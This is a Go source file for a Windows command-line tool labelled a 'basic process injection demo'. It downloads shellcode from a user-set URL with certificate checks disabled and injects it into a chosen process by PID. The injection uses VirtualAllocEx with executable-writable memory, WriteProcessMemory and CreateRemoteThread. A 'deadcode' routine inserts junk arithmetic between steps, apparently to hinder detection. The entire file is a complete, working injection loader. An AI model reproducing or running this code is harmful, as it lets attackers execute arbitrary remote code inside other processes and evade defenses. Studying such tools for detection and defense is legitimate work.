package main

import (
        "os"
        "fmt"
        "sort"
        "time"
        "math"
        "bufio"
        "unsafe"
        "strings"
        "strconv"
        "syscall"
        "net/http"
        "io/ioutil"
        "math/rand"
        "crypto/tls"
)

// https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
// https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
const (
        MEM_COMMIT             = 0x1000
        MEM_RESERVE            = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        PROCESS_CREATE_THREAD  = 0x0002
        PROCESS_VM_OPERATION   = 0x0008
        PROCESS_VM_WRITE       = 0x0020
)

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/
// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/
var (
        kernel32           = syscall.MustLoadDLL("kernel32.dll")
        OpenProcess        = kernel32.MustFindProc("OpenProcess")
        VirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
        WriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
        CreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
        GetThreadId        = kernel32.MustFindProc("GetThreadId")
        CloseHandle        = kernel32.MustFindProc("CloseHandle")

        vars = map[string]interface{} {
                "PID": 0,
                "PAYLOAD_URL": "",
                "PAUSE": false,
        }
)

func main () {
        fmt.Println("Joypopping RWX: Basic process injection demo")
        fmt.Println("Enter 'help' for command listing")

        stdin := bufio.NewReader(os.Stdin)
        for {
                fmt.Print("\n> ")
                input, _ := stdin.ReadString('\n')
                input = strings.TrimSpace(input)

                fields := strings.Fields(input)
                if len(fields) == 0 {
                        continue
                }

                command := strings.ToUpper(fields[0])
                arguments := fields[1:]
                switch command {
                case "HELP":
                        fmt.Println("[*] Available commands:")
                        fmt.Println("help\tshows this page")
                        fmt.Println("show\tshow current variable values")
                        fmt.Println("set\tchange variable values")
                        fmt.Println("inject\tlaunch injection with current values")
                        fmt.Println("exit\texit demo")

                case "SET":
                        if len(arguments) != 2 {
                                fmt.Println("[!] Invalid set command: incorrect number of arguments")
                                continue
                        }

                        set(strings.ToUpper(arguments[0]), arguments[1])

                case "SHOW":
                        fmt.Println("[*] Current variable values:")
                        // iterate and sort keys first
                        keys := make([]string, 0, len(vars))
                        for key := range vars {
                                keys = append(keys, key)
                        }

                        sort.Strings(keys)
                        for _, key := range keys {
                                value := vars[key]
                                fmt.Printf("%s: %v\n", key, value)
                        }

                case "INJECT":
                        url := vars["PAYLOAD_URL"].(string)
                        if len(url) == 0 {
                                fmt.Println("[!] Cannot launch injection: URL not set")
                                continue
                        }

                        http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
                        resp, err := http.Get(url)
                        if (err != nil || resp.StatusCode != http.StatusOK) {
                                fmt.Println("[!] Failed to fetch shellcode from URL")
                                continue
                        }

                        shellcodeBytes, err := ioutil.ReadAll(resp.Body)
                        if err != nil {
                                fmt.Println("[!] Failed to read response body")
                                continue
                        }

                        pid := vars["PID"].(int)
                        pause := vars["PAUSE"].(bool)
                        inject(pid, shellcodeBytes, pause)

                case "EXIT":
                        os.Exit(0)

                default:
                        fmt.Println("[!] Unrecognized command")
                }
        }
}

func set(key, value string) {
        v, exists := vars[key]
        if !exists {
                fmt.Println("[!] Invalid set command: variable does not exist")
                return
        }

        switch v.(type) {
        case string:
                vars[key] = value

        case int:
                n, err := strconv.Atoi(value)
                if err != nil {
                        fmt.Printf("[!] Invalid set command: %s must be an integer\n", key)
                        return
                }

                if n < 0 {
                        fmt.Printf("[!] Invalid set command: %s cannot be less than zero\n", key)
                        return
                }
                vars[key] = n

        case bool:
                b, err := strconv.ParseBool(value)
                if err != nil {
                        fmt.Printf("[!] Invalid set command: %s must be a boolean\n", key)
                        return
                }
                vars[key] = b
        }
}

func inject(PID int, shellcode []byte, pause bool) {
        fmt.Printf("[*] Starting injection into PID: %d\n", PID)

        // Obtain handle to target process
        // Current user must pass Windows access control checks
        processHandle, _, err := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE, 0, uintptr(PID))
        if processHandle == 0 {
                fmt.Printf("[!] OpenProcess failed: %s\n", err)
                return
        }
        fmt.Printf("[*] OpenProcess: obtained handle %#x\n", processHandle)

        deadcode()
        if pause {
                fmt.Print("[*] PAUSED")
                fmt.Scanln()
        }

        // Allocate memory for shellcode
        memSize := len(shellcode)
        shellcodeAddress, _, err := VirtualAllocEx.Call(uintptr(processHandle), 0, uintptr(memSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if shellcodeAddress == 0 {
                fmt.Printf("[!] VirtualAllocEx failed: %s\n", err)
                return
        }
        fmt.Printf("[*] VirtualAllocEx: allocated %d bytes at %#x\n", memSize, shellcodeAddress)

        deadcode()
        if pause {
                fmt.Print("[*] PAUSED")
                fmt.Scanln()
        }

        // Write shellcode to allocated memory
        ret, _, err := WriteProcessMemory.Call(processHandle, shellcodeAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
        if ret == 0 {
                fmt.Printf("[!] WriteProcessMemory failed: %s\n", err)
                return
        }
        fmt.Printf("[*] WriteProcessMemory: wrote %d bytes at %#x\n", len(shellcode), shellcodeAddress)

        deadcode()
        if pause {
                fmt.Print("[*] PAUSED")
                fmt.Scanln()
        }

        // Create thread in target process pointing to shellcode start
        threadHandle, _, err := CreateRemoteThread.Call(processHandle, 0, 0, shellcodeAddress, 0, 0, 0)
        if threadHandle == 0 {
                fmt.Printf("[!] CreateRemoteThread failed: %s\n", err)
                return
        }

        // Get TID of new thread in target process
        // Not needed for this technique, just makes for better output :)
        TID, _, err := GetThreadId.Call(threadHandle)
        if TID == 0 {
                fmt.Printf("[!] GetThreadId failed: %s\n", err)
                return
        }
        fmt.Printf("[*] CreateRemoteThread: spawned thread %d\n", TID)

        // Close process and thread handles
        ret, _, err = CloseHandle.Call(processHandle)
        if ret == 0 {
                fmt.Printf("[!] CloseHandle failed: %s\n", err)
                return
        }
        fmt.Printf("[*] CloseHandle: closed handle %#x\n", processHandle)

        ret, _, err = CloseHandle.Call(threadHandle)
        if ret == 0 {
                fmt.Printf("[!] CloseHandle failed: %s\n", err)
                return
        }
        fmt.Printf("[*] CloseHandle: closed handle %#x\n", threadHandle)

        return
}

func deadcode() {
        rand.Seed(time.Now().UnixNano())
        for a := 1; a < rand.Intn(51) + 50; a++ {
                b := float32(rand.Float64())
                c := math.Float32bits(b)
                c = 0x5f3759df - (c >> 1)
                d := math.Float32frombits(c)
                d = d * (1.5 - (b * 0.5 * d * d))
        }
}
